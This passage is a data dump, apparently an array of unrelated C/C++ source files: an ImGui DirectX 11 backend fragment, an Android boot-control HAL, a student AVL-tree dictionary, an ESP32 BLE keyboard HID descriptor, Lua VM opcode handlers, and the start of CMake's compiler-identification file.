NULL;\nstatic ID3D11InputLayout*       g_pInputLayout = NULL;\nstatic ID3D11Buffer*            g_pVertexConstantBuffer = NULL;\nstatic ID3D10Blob*              g_pPixelShaderBlob = NULL;\nstatic ID3D11PixelShader*       g_pPixelShader = NULL;\nstatic ID3D11SamplerState*      g_pFontSampler = NULL;\nstatic ID3D11ShaderResourceView*g_pFontTextureView = NULL;\nstatic ID3D11RasterizerState*   g_pRasterizerState = NULL;\nstatic ID3D11BlendState*        g_pBlendState = NULL;\nstatic ID3D11DepthStencilState* g_pDepthStencilState = NULL;\nstatic int                      g_VertexBufferSize = 5000, g_IndexBufferSize = 10000;\n\nstruct VERTEX_CONSTANT_BUFFER\n{\n    float   mvp[4][4];\n};\n\nstatic void ImGui_ImplDX11_SetupRenderState(ImDrawData* draw_data, ID3D11DeviceContext* ctx)\n{\n    // Setup viewport\n    D3D11_VIEWPORT vp;\n    memset(&vp, 0, sizeof(D3D11_VIEWPORT));\n    vp.Width = draw_data->DisplaySize.x;\n    vp.Height = draw_data->DisplaySize.y;\n    vp.MinDepth = 0.0f;\n    vp.MaxDepth = 1.0f;\n    vp.TopLeftX = vp.TopLeftY = 0;\n    ctx->RSSetViewports(1, &vp);\n\n    // Setup shader and vertex buffers\n    unsigned int stride = sizeof(ImDrawVert);\n    unsigned int offset = 0;\n    ctx->IASetInputLayout(g_pInputLayout);\n    ctx->IASetVertexBuffers(0, 1, &g_pVB, &stride, &offset);\n    ctx->IASetIndexBuffer(g_pIB, sizeof(ImDrawIdx) == 2 ? DXGI_FORMAT_R16_UINT : DXGI_FORMAT_R32_UINT, 0);\n    ctx->IASetPrimitiveTopology(D3D11_PRIMITIVE_TOPOLOGY_TRIANGLELIST);\n    ctx->VSSetShader(g_pVertexShader, NULL, 0);\n    ctx->VSSetConstantBuffers(0, 1, &g_pVertexConstantBuffer);\n    ctx->PSSetShader(g_pPixelShader, NULL, 0);\n    ctx->PSSetSamplers(0, 1, &g_pFontSampler);\n    ctx->GSSetShader(NULL, NULL, 0);\n    ctx->HSSetShader(NULL, NULL, 0); // In theory we should backup and restore this as well.. very infrequently used..\n    ctx->DSSetShader(NULL, NULL, 0); // In theory we should backup and restore this as well.. very infrequently used..\n    ctx->CSSetShader(NULL, NULL, 0); // In theory we should backup and restore this as well.. very infrequently used..\n\n    // Setup blend state\n    const float blend_factor[4] ",
    "/*\n * Copyright (C) 2019 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n#include <cstdint>\n#define LOG_TAG \"android.hardware.boot@1.2-mtkimpl\"\n\n#include <memory>\n\n#include <log/log.h>\n#include <android-base/logging.h>\n#include <bootloader_message/bootloader_message.h>\n\n#include \"BootControl.h\"\n#include \"boot_region_control_private.h\"\n#include \"boot_control_definition.h\"\n\nnamespace android {\nnamespace hardware {\nnamespace boot {\nnamespace V1_2 {\nnamespace implementation {\n\nusing ::android::hardware::boot::V1_0::CommandResult;\nusing namespace android::bootable;\n\nbool BootControl::Init() {\n    return impl_.Init();\n}\n\n// Methods from ::android::hardware::boot::V1_0::IBootControl follow.\nReturn<uint32_t> BootControl::getNumberSlots() {\n    return impl_.GetNumberSlots();\n}\n\nReturn<uint32_t> BootControl::getCurrentSlot() {\n    return impl_.GetCurrentSlot();\n}\n\nReturn<void> BootControl::clearAvbbctlFlag() {\n  std::string err;\n  std::string device = get_bootloader_message_blk_device(&err);\n  if (device.empty()) {\n    LOG(ERROR) << \"Could not find bootloader message block device: \" << err;\n    return Void();\n  }\n\n  bootloader_control boot_ctrl;\n  if (!LoadBootloaderControl(device, &boot_ctrl)) {\n    LOG(ERROR) << \"Failed to load bootloader control block\";\n    return Void();\n  }\n\n  uint32_t computed_crc32 = BootloaderControlLECRC(&boot_ctrl);\n  if (boot_ctrl.crc32_le == computed_crc32 &&  boot_ctrl.reserved1[0] == 1) {\n    boot_ctrl.reserved1[0] = 0;\n    LOG(INFO) << \"Clear avb boot control convert flag\";\n    UpdateAndSaveBootloaderControl(device, &boot_ctrl);\n  }\n  return Void();\n}\n\nReturn<void> BootControl::markBootSuccessful(markBootSuccessful_cb _hidl_cb) {\n    struct CommandResult cr;\n    if (impl_.MarkBootSuccessful()) {\n        cr.success = true;\n        cr.errMsg = \"Success\";\n        clearAvbbctlFlag();\n    } else {\n        cr.success = false;\n        cr.errMsg = \"Operation failed\";\n    }\n    _hidl_cb(cr);\n    return Void();\n}\n\nReturn<void> BootControl::setActiveBootSlot(uint32_t slot, setActiveBootSlot_cb _hidl_cb) {\n    struct CommandResult cr;\n    if (impl_.SetActiveBootSlot(slot) && implext_.SetBootRegionSlot(slot)) {\n        cr.success = true;\n        cr.errMsg = \"Success\";\n    } else {\n        cr.success = false;\n        cr.errMsg = \"Operation failed\";\n    }\n    _hidl_cb(cr);\n    return Void();\n}\n\nReturn<void> BootControl::setSlotAsUnbootable(uint32_t slot, setSlotAsUnbootable_cb _hidl_cb) {\n    struct CommandResult cr;\n    if (impl_.SetSlotAsUnbootable(slot)) {\n        cr.success = true;\n        cr.errMsg = \"Success\";\n    } else {\n        cr.success = false;\n        cr.errMsg = \"Operation failed\";\n    }\n    _hidl_cb(cr);\n    return Void();\n}\n\nReturn<BoolResult> BootControl::isSlotBootable(uint32_t slot) {\n    if (!impl_.IsValidSlot(slot)) {\n        return BoolResult::INVALID_SLOT;\n    }\n    return impl_.IsSlotBootable(slot) ? BoolResult::TRUE : BoolResult::FALSE;\n}\n\nReturn<BoolResult> BootControl::isSlotMarkedSuccessful(uint32_t slot) {\n    if (!impl_.IsValidSlot(slot)) {\n        return BoolResult::INVALID_SLOT;\n    }\n    return impl_.IsSlotMarkedSuccessful(slot) ? BoolResult::TRUE : BoolResult::FALSE;\n}\n\nReturn<void> BootControl::getSuffix(uint32_t slot, getSuffix_cb _hidl_cb) {\n    hidl_string ans;\n    const char* suffix = impl_.GetSuffix(slot);\n    if (suffix) {\n        ans = suffix;\n    }\n    _hidl_cb(ans);\n    return Void();\n}\n\n// Methods from ::android::hardware::boot::V1_1::IBootControl follow.\nReturn<bool> BootControl::setSnapshotMergeStatus(MergeStatus status) {\n    return impl_.SetSnapshotMergeStatus(status);\n}\n\nReturn<MergeStatus> BootControl::getSnapshotMergeStatus() {\n    return impl_.GetSnapshotMergeStatus();\n}\n\n// Methods from ::android::hardware::boot::V1_2::IBootControl follow.\nReturn<uint32_t> BootControl::getActiveBootSlot() {\n    if (!impl_.GetActiveBootSlot()) {\n        return 0;\n    }\n    return impl_.GetActiveBootSlot();\n}\n\nIBootControl* HIDL_FETCH_IBootControl(const char* /* hal */) {\n    auto module = std::make_unique<BootControl>();\n    if (!module->Init()) {\n        ALOGE(\"Could not initialize BootControl module\");\n        return nullptr;\n    }\n    return module.release();\n}\n\n}  // namespace implementation\n}  // namespace V1_2\n}  // namespace boot\n}  // namespace hardware\n}  // namespace android\n",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nstruct node {\r\n    char word[20], mean[20];\r\n    node *left;\r\n    node *right;\r\n    int ht;\r\n\r\n    node() {\r\n        left = NULL;\r\n        right = NULL;\r\n    }\r\n};\r\n\r\nclass AVL\r\n{\r\n\tpublic:\r\n\r\n\tnode* create(node *root);\r\n\tnode* insert(node *root,char word[],char mean[]);\r\n\tvoid display(node *);\r\n\tint height(node *);\r\n\tnode* search(node* root,  char word[]);\r\n\tnode* minValueNode(node* root);\r\n\tnode* deleteNode(node* root,  char word[]);\r\n    node* update(node* root, char word[], char newMean[]);\r\n    node* balanceNode(node* root);\r\n   \tnode* rotateright(node *);\r\n   \tnode* rotateleft(node *);\r\n    int BF(node *);\r\n   \tnode* RR(node*);\r\n   \tnode* LL(node*);\r\n   \tnode* RL(node*);\r\n   \tnode* LR(node*);\r\n};\r\n\r\nnode* AVL::create(node *root)\r\n{\r\n\tint n,i;\r\n\tchar w[20],m[50];\r\n\tcout<<\"\\n Enter total number of words:\";\r\n\tcin>>n;\r\n\tfor(i=0;i<n;i++)\r\n\t{\r\n\t\tcout<<\"\\n Enter word \"<<i+1<<\" : \";\r\n\t\tcin>>w;\r\n\t\tcout<<\"\\n Enter meaning : \";\r\n\t\tcin>>m;\r\n\t\troot=insert(root,w,m);\r\n\r\n\t}\r\n\treturn root;\r\n}\r\n\r\n\r\nnode* AVL::insert(node *root,char w[],char m[]) {\r\n    if(root==NULL) {\r\n        root=new node;\r\n        strcpy(root->word,w);\r\n        strcpy(root->mean,m);\r\n        root->left=NULL;\r\n        root->right=NULL;\r\n        return root;\r\n    } else {\r\n        if(strcmp(w,root->word)>0) {\r\n            root->right=insert(root->right,w,m);\r\n            if(BF(root)==-2) {\r\n                if(strcmp(w,root->word)>0)\r\n                    root=RR(root);\r\n                else\r\n                    root=RL(root);\r\n            }\r\n        } else {\r\n            if(strcmp(w,root->word)<0) {\r\n                root->left=insert(root->left,w,m);\r\n                if(BF(root)==2) {\r\n                    if(strcmp(w,root->word)<0)\r\n                        root=LL(root);\r\n                    else\r\n                        root=LR(root);\r\n                }\r\n            }\r\n        }\r\n    }\r\n    root->ht=height(root);\r\n    return root;\r\n}\r\n\r\n\r\n\r\nvoid AVL::display(node* root)\r\n{\r\n\tif(root!=NULL)\r\n\t{\r\n\t\tdisplay(root->left);\r\n\t\tcout<<\"\\n Node is:\"<<root->word<<\"-\"<<root->mean;\r\n\t\tdisplay(root->right);\r\n\t}\r\n\t\r\n}\r\n\r\n\r\nint AVL::height(node *root)\r\n{\r\n\tif(root==NULL){\r\n\t\treturn 0;\r\n\t}\r\n\telse{\r\n\t\tint r = height(root->right);\r\n\t\tint l = height(root->left);\r\n\t\treturn (1+max(r,l));\r\n\t}\r\n}\r\n\r\nnode* AVL::rotateright(node *x)\r\n{\r\n\tnode *y;\r\n\ty=x->left;\r\n\tx->left=y->right;\r\n\ty->right=x;\r\n\tx->ht=height(x);\r\n\ty->ht=height(y);\r\n\treturn(y);\r\n}\r\n\r\nnode* AVL::rotateleft(node *x)\r\n{\r\n\tnode *y;\r\n\ty=x->right;\r\n\tx->right=y->left;\r\n\ty->left=x;\r\n\tx->ht=height(x);\r\n\ty->ht=height(y);\r\n\treturn(y);\r\n}\r\nint AVL::BF(node *root)\r\n{\r\n\tint lh,rh;\r\n\tif(root==NULL)\r\n\t\treturn(0);\r\n\tif(root->left==NULL)\r\n\t\tlh=0;\r\n\telse\r\n\t\tlh=1+root->left->ht;\r\n\tif(root->right==NULL)\r\n\t  rh=0;\r\n\telse\r\n\t\trh=1+root->right->ht;\r\n\tint z=lh-rh;\r\n\treturn(z);\r\n}\r\n\r\n\r\nnode* AVL::RR(node *T)\r\n{\r\n\tT=rotateleft(T);\r\n\treturn(T);\r\n}\r\nnode* AVL::LL(node *T)\r\n{\r\n\tT=rotateright(T);\r\n\treturn(T);\r\n}\r\nnode* AVL::LR(node *T)\r\n{\r\n\tT->left=rotateleft(T->left);\r\n\tT=rotateright(T);\r\n\treturn(T);\r\n}\r\nnode* AVL::RL(node *T)\r\n{\r\n\tT->right=rotateright(T->right);\r\n\tT=rotateleft(T);\r\n\treturn(T);\r\n}\r\n\r\nnode* AVL::search(node* root, char word[]) \r\n{\r\n    if (root == NULL || strcmp(root->word, word) == 0)\r\n        return root;\r\n\r\n    if (strcmp(root->word, word) < 0)\r\n        return search(root->right, word);\r\n\r\n    return search(root->left, word);\r\n}\r\n\r\n\r\nnode* AVL::update(node* root, char word[], char newMean[]) {\r\n    root = deleteNode(root, word); \r\n    root = insert(root, word, newMean); \r\n    return root;\r\n}\r\n\r\nnode *AVL::minValueNode(node *root) {\r\n    node* current = root;\r\n    while (current->left != NULL)\r\n        current = current->left;\r\n    return current;\r\n}\r\n\r\nnode* AVL::balanceNode(node* root) {\r\n    int balance = BF(root);\r\n\r\n    if (balance > 1 && BF(root->left) >= 0)\r\n        return LL(root);\r\n\r\n    if (balance > 1 && BF(root->left) < 0)\r\n        return LR(root);\r\n\r\n    if (balance < -1 && BF(root->right) <= 0)\r\n        return RR(root);\r\n\r\n    if (balance < -1 && BF(root->right) > 0)\r\n        return RL(root);\r\n\r\n    return root;\r\n}\r\n\r\n\r\nnode* AVL:: deleteNode(node * root,char k[20])\r\n{\r\n\tnode *temp;\r\n \tif(root == NULL)\r\n \t{\r\n  \t\tcout<<\"\\nElement No Found\";\r\n  \t\treturn root;\r\n \t}\r\n \tif (strcmp(k,root->word) < 0)\r\n \t{\r\n  \t\troot->left = deleteNode(root->left, k);\r\n  \t\treturn root;\r\n \t}\r\n \tif (strcmp(k,root->word) > 0)\r\n \t{\r\n   \t\troot->right = deleteNode(root->right, k);\r\n   \t\treturn root;\r\n \t}\r\n \tif (root->right==NULL&&root->left==NULL)\r\n \t{\r\n  \t\ttemp = root;\r\n  \t\tdelete temp;\r\n  \t\treturn NULL;\r\n  \t}\r\n  \tif(root->right==NULL)\r\n  \t{\r\n  \t\ttemp = root;\r\n  \t\troot = root->left;\r\n  \t\tdelete temp;\r\n  \t\treturn root;\r\n  \t}\r\n  \telse if(root->left==NULL)\r\n  \t{\r\n  \t\ttemp = root;\r\n  \t\troot = root->right;\r\n  \t\tdelete temp;\r\n  \t\treturn root;\r\n  \t}\r\n  \ttemp = minValueNode(root->right);\r\n  \tstrcpy(root->word,temp->word);\r\n  \troot->right = deleteNode(root->right, temp->word);\r\n  \treturn root;\r\n\r\n}\r",
    "#include \"BleKeyboard.h\"\n\n#if defined(USE_NIMBLE)\n#include <NimBLEDevice.h>\n#include <NimBLEServer.h>\n#include <NimBLEUtils.h>\n#include <NimBLEHIDDevice.h>\n#else\n#include <BLEDevice.h>\n#include <BLEUtils.h>\n#include <BLEServer.h>\n#include \"BLE2902.h\"\n#include \"BLEHIDDevice.h\"\n#endif // USE_NIMBLE\n#include \"HIDTypes.h\"\n#include <driver/adc.h>\n#include \"sdkconfig.h\"\n\n\n#if defined(CONFIG_ARDUHAL_ESP_LOG)\n  #include \"esp32-hal-log.h\"\n  #define LOG_TAG \"\"\n#else\n  #include \"esp_log.h\"\n  static const char* LOG_TAG = \"BLEDevice\";\n#endif\n\n\n// Report IDs:\n#define KEYBOARD_ID 0x01\n#define MEDIA_KEYS_ID 0x02\n\nstatic const uint8_t _hidReportDescriptor[] = {\n  USAGE_PAGE(1),      0x01,          // USAGE_PAGE (Generic Desktop Ctrls)\n  USAGE(1),           0x06,          // USAGE (Keyboard)\n  COLLECTION(1),      0x01,          // COLLECTION (Application)\n  // ------------------------------------------------- Keyboard\n  REPORT_ID(1),       KEYBOARD_ID,   //   REPORT_ID (1)\n  USAGE_PAGE(1),      0x07,          //   USAGE_PAGE (Kbrd/Keypad)\n  USAGE_MINIMUM(1),   0xE0,          //   USAGE_MINIMUM (0xE0)\n  USAGE_MAXIMUM(1),   0xE7,          //   USAGE_MAXIMUM (0xE7)\n  LOGICAL_MINIMUM(1), 0x00,          //   LOGICAL_MINIMUM (0)\n  LOGICAL_MAXIMUM(1), 0x01,          //   Logical Maximum (1)\n  REPORT_SIZE(1),     0x01,          //   REPORT_SIZE (1)\n  REPORT_COUNT(1),    0x08,          //   REPORT_COUNT (8)\n  HIDINPUT(1),        0x02,          //   INPUT (Data,Var,Abs,No Wrap,Linear,Preferred State,No Null Position)\n  REPORT_COUNT(1),    0x01,          //   REPORT_COUNT (1) ; 1 byte (Reserved)\n  REPORT_SIZE(1),     0x08,          //   REPORT_SIZE (8)\n  HIDINPUT(1),        0x01,          //   INPUT (Const,Array,Abs,No Wrap,Linear,Preferred State,No Null Position)\n  REPORT_COUNT(1),    0x05,          //   REPORT_COUNT (5) ; 5 bits (Num lock, Caps lock, Scroll lock, Compose, Kana)\n  REPORT_SIZE(1),     0x01,          //   REPORT_SIZE (1)\n  USAGE_PAGE(1),      0x08,          //   USAGE_PAGE (LEDs)\n  USAGE_MINIMUM(1),   0x01,          //   USAGE_MINIMUM (0x01) ; Num Lock\n  USAGE_MAXIMUM(1),   0x05,          //   USAGE_MAXIMUM (0x05) ; Kana\n  HIDOUTPUT(1),       0x02,          //   OUTPUT (Data,Var,Abs,No Wrap,Linear,Preferred State,No Null Position,Non-volatile)\n  REPORT_COUNT(1),    0x01,          //   REPORT_COUNT (1) ; 3 bits (Padding)\n  REPORT_SIZE(1),     0x03,          //   REPORT_SIZE (3)\n  HIDOUTPUT(1),       0x01,          //   OUTPUT (Const,Array,Abs,No Wrap,Linear,Preferred State,No Null Position,Non-volatile)\n  REPORT_COUNT(1),    0x06,          //   REPORT_COUNT (6) ; 6 bytes (Keys)\n  REPORT_SIZE(1),     0x08,          //   REPORT_SIZE(8)\n  LOGICAL_MINIMUM(1), 0x00,          //   LOGICAL_MINIMUM(0)\n  LOGICAL_MAXIMUM(1), 0x73,          //   LOGICAL_MAXIMUM(0x65) ; 101 keys\n  USAGE_PAGE(1),      0x07,          //   USAGE_PAGE (Kbrd/Keypad)\n  USAGE_MINIMUM(1),   0x00,          //   USAGE_MINIMUM (0)\n  USAGE_MAXIMUM(1),   0x73,          //   USAGE_MAXIMUM ()\n  HIDINPUT(1),        0x00,          //   INPUT (Data,Array,Abs,No Wrap,Linear,Preferred State,No Null Position)\n  END_COLLECTION(0),                 // END_COLLECTION\n  // ------------------------------------------------- Media Keys\n  USAGE_PAGE(1),      0x0C,          // USAGE_PAGE (Consumer)\n  USAGE(1),           0x01,          // USAGE (Consumer Control)\n  COLLECTION(1),      0x01,          // COLLECTION (Application)\n  REPORT_ID(1),       MEDIA_KEYS_ID, //   REPORT_ID (3)\n  USAGE_PAGE(1),      0x0C,          //   USAGE_PAGE (Consumer)\n  LOGICAL_MINIMUM(1), 0x00,          //   LOGICAL_MINIMUM (0)\n  LOGICAL_MAXIMUM(1), 0x01,          //   LOGICAL_MAXIMUM (1)\n  REPORT_SIZE(1),     0x01,          //   REPORT_SIZE (1)\n  REPORT_COUNT(1),    0x10,          //   REPORT_COUNT (16)\n  USAGE(1),           0xB5,          //   USAGE (Scan Next Track)     ; bit 0: 1\n  USAGE(1),           0xB6,          //   USAGE (Scan Previous Track) ; bit 1: 2\n  USAGE(1),           0xB7,          //   USAGE (Stop)                ; bit 2: 4\n  USAGE(1),           0xCD,          //   USAGE (Play/Pause)          ; bit 3: 8\n  USAGE(1),           0xE2,          //   USAGE (Mute)                ; bit 4: 16\n  USAGE(1),           0xE9,          //   USAGE (Volume Increment)    ; bit 5: 32\n  USAGE(1),           0xEA,          //   USAGE (Volume Decrement)    ; bit 6: 64\n  USAGE(2),           0x23, 0x02,    //   Usage (WWW Home)            ; bit 7: 128\n  USAGE(2),           0x94, 0x01,    //   Usage (My Computer) ; bit 0: 1\n  USAGE(2),           0x92, 0x01,    //   Usage (Calculator)  ; bit 1: 2\n  USAGE(2),           0x2A, 0x02,    //   Usage (WWW fav)     ; bit 2: 4\n  USAGE(2),           0x21, 0x02,    //   Usage (WWW search)  ; bit 3: 8\n  USAGE(2),           0x26, 0x02,    //   Usage (WWW stop)    ; bit 4: 16\n  USAGE(2),           0x24, 0x02,    //   Usage (WWW back)    ; bit 5: 32\n  USAGE(2),           0x83, 0x01,    //   Usage (Media sel)   ; bit 6: 64\n  USAGE(2),           0x8A, 0x01,    //   Usage (Mail) ",
    "/*********************************************\n// Created by m1556 on 2024/4/25 21:17.\n*********************************************/\n\n#include \"inst_operators.h\"\n#include \"../lua_state.h\"\n\n\nvoid binaryArith_(Instruction *i, LuaVM *vm, ArithOp op) {\n    int a, b, c;\n    i->ABC(a, b, c);\n    a += 1;\n\n    vm->GetRK(b);\n    vm->GetRK(c);\n\n    auto vm_ = dynamic_cast<LuaState *>(vm);\n    vm_->Arith(op);\n    vm_->replace(a);\n}\n\nvoid unaryArith_(Instruction *i, LuaVM *vm, ArithOp op) {\n    int a, b, c;\n    i->ABC(a, b, c);\n    a += 1;\n    b += 1;\n\n    auto vm_ = dynamic_cast<LuaState *>(vm);\n    vm_->pushValue(b);\n    vm_->Arith(op);\n    vm_->replace(a);\n}\n\nvoid add(Instruction *i, LuaVM *vm) {\n    binaryArith_(i, vm, ArithOp::LUA_OPADD);\n}\n\nvoid sub(Instruction *i, LuaVM *vm) {\n    binaryArith_(i, vm, ArithOp::LUA_OPSUB);\n}\n\nvoid mul(Instruction *i, LuaVM *vm) {\n    binaryArith_(i, vm, ArithOp::LUA_OPMUL);\n}\n\nvoid mod(Instruction *i, LuaVM *vm) {\n    binaryArith_(i, vm, ArithOp::LUA_OPMOD);\n}\n\nvoid pow(Instruction *i, LuaVM *vm) {\n    binaryArith_(i, vm, ArithOp::LUA_OPPOW);\n}\n\nvoid div(Instruction *i, LuaVM *vm) {\n    binaryArith_(i, vm, ArithOp::LUA_OPDIV);\n}\n\nvoid idiv(Instruction *i, LuaVM *vm) {\n    binaryArith_(i, vm, ArithOp::LUA_OPIDIV);\n}\n\nvoid band(Instruction *i, LuaVM *vm) {\n    binaryArith_(i, vm, ArithOp::LUA_OPBAND);\n}\n\nvoid bor(Instruction *i, LuaVM *vm) {\n    binaryArith_(i, vm, ArithOp::LUA_OPBOR);\n}\n\nvoid bxor(Instruction *i, LuaVM *vm) {\n    binaryArith_(i, vm, ArithOp::LUA_OPBXOR);\n}\n\nvoid shl(Instruction *i, LuaVM *vm) {\n    binaryArith_(i, vm, ArithOp::LUA_OPSHL);\n}\n\nvoid shr(Instruction *i, LuaVM *vm) {\n    binaryArith_(i, vm, ArithOp::LUA_OPSHR);\n}\n\nvoid unm(Instruction *i, LuaVM *vm) {\n    unaryArith_(i, vm, ArithOp::LUA_OPUNM);\n}\n\nvoid bnot(Instruction *i, LuaVM *vm) {\n    unaryArith_(i, vm, ArithOp::LUA_OPBNOT);\n}\n\nvoid len_(Instruction *i, LuaVM *vm) {\n    int a, b, c;\n    i->ABC(a, b, c);\n    a += 1;\n    b += 1;\n    auto vm_ = dynamic_cast<LuaState *>(vm);\n    vm_->Len(b);\n    vm_->replace(a);\n}\n\nvoid concat(Instruction *i, LuaVM *vm) {\n    int a, b, c;\n    i->ABC(a, b, c);\n    a += 1;\n    b += 1;\n    c += 1;\n    int n = c - b + 1;\n    auto vm_ = dynamic_cast<LuaState *>(vm);\n    vm_->checkStack(n);\n    for (int j = b; j <= c; ++j) {\n        vm_->pushValue(j);\n    }\n    vm_->Concat(n);\n    vm_->replace(a);\n}\n\nvoid compare_(Instruction *i, LuaVM *vm, CompareOp op) {\n    int a, b, c;\n    i->ABC(a, b, c);\n    auto vm_ = dynamic_cast<LuaState *>(vm);\n    vm_->GetRK(b);\n    vm_->GetRK(c);\n    if (vm_->Compare(-2, -1, op) != (a != 0)) {\n        vm_->AddPC(1);\n    }\n    vm_->pop(2);\n}\n\nvoid eq(Instruction *i, LuaVM *vm) {\n    compare_(i, vm, CompareOp::LUA_OPEQ);\n}\n\nvoid lt(Instruction *i, LuaVM *vm) {\n    compare_(i, vm, CompareOp::LUA_OPLT);\n}\n\nvoid le(Instruction *i, LuaVM *vm) {\n    compare_(i, vm, CompareOp::LUA_OPLE);\n}\n\nvoid not_(Instruction *i, LuaVM *vm) {\n    int a, b, c;\n    i->ABC(a, b, c);\n    a += 1;\n    b += 1;\n    auto vm_ = dynamic_cast<LuaState *>(vm);\n    vm_->pushBoolean(!vm_->toBoolean(b));\n    vm_->replace(a);\n}\n\nvoid testSet(Instruction *i, LuaVM *vm) {\n    int a, b, c;\n    i->ABC(a, b, c);\n    a += 1;\n    b += 1;\n    auto vm_= dynamic_cast<LuaState *>(vm);\n    if (vm_->toBoolean(b) == (c != 0)) {\n        vm_->copy(b, a);\n    } else {\n        vm_->AddPC(1);\n    }\n}\n\nvoid test(Instruction *i, LuaVM *vm) {\n    int a, b, c;\n    i->ABC(a, b, c);\n    a += 1;\n    auto vm_ = dynamic_cast<LuaState *>(vm);\n    if (vm_->toBoolean(a) != (c != 0)) {\n        vm_->AddPC(1);\n    }\n}\n\nvoid forPrep(Instruction *i, LuaVM *vm) {\n    int a, sBx;\n    i->AsBx(a, sBx);\n    a += 1;\n\n    auto vm_ = dynamic_cast<LuaState *>(vm);\n    // R(A) -= R(A + 2)\n    vm_->pushValue(a);\n    vm_->pushValue(a + 2);\n    vm_->Arith(ArithOp::LUA_OPSUB);\n    vm_->replace(a);\n    // pc += sBx\n    vm_->AddPC(sBx);\n}\n\nvoid forLoop(Instruction *i, LuaVM *vm) {\n    int a, sBx;\n    i->AsBx(a, sBx);\n    a += 1;\n\n    auto vm_ = dynamic_cast<LuaState *>(vm);\n    // R(A) += R(A + 2)\n    vm_->pushValue(a + 2);\n    vm_->pushValue(a);\n    vm_->Arith(ArithOp::LUA_OPADD);\n    vm_->replace(a);\n\n    // R(A) <?= R(A + 1)\n    auto isPositiveStep = vm_->toNumber(a + 2) >= 0;\n    if (isPositiveStep && vm_->Compare(a, a + 1, CompareOp::LUA_OPLE) ||\n            !isPositiveStep && vm_->Compare(a + 1, a, CompareOp::LUA_OPLE)) {\n        vm_->AddPC(sBx);                    // pc += sBx\n        vm_->copy(a, a + 3);    // R(A + 3) = R(A)\n    }\n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if 